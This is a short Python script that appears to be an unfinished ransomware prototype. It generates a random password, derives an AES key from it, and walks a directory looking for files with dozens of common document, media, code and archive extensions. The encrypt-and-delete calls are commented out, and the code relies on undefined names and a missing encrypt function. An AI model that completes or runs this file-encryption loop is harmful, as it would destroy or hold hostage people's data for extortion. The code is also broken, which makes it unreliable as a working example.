import random
import string
from Crypto.Cipher import AES
from Crypto.Hash import SHA256
from Crypto import Random
import threading
import os
import sys
from os import walk

def encrypt_all_files():
    password = ''.join(random.choice(string.ascii_letters + string.digits) for _ in range(32)) 
    ext = ('.jpg', '.png', '.bmp', '.raw', '.c', '.java', '.class', '.cpp', '.h', '.jar', '.txt', '.doc', '.docx', '.pdf', '.ptx', '.ppt', '.rar', '.zip', '.7z', '.mp3', '.mp4', '.mpg', '.mpeg', '.avi', '.tar.gz', '.sql', '.xml', '.py', '.js', '.php', '.pps', '.cs', '.xls', '.xlsx', '.3gp', '.mov', '.mkv', '.vob', '.wps', '.odt')
    for root, dirs, files in os.walk("/TestFiles", topdown=True):  # iterate from home
        for filename in files:
            if filename.endswith(ext) and not filename.startswith(encrypted_symbol):  
                try:
                    key = SHA256.new(password.encode('utf-8')).digest()  
                    filepath = os.path.abspath(os.path.join(root, filename))
                    print("aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa")
                    # encrypt_file(key, filename, filepath)  # calls the encrypt function
                    # os.remove(filepath)  # deletes the file
                    break
                except:
                    pass
        break

def GetAllFiles():
    f = []
    for (dirpath, dirnames, filenames) in walk(mypath):
        f.extend(filenames)
        break
    return f

###################### main ######################

files_list = GetAllFiles()
print(files_list)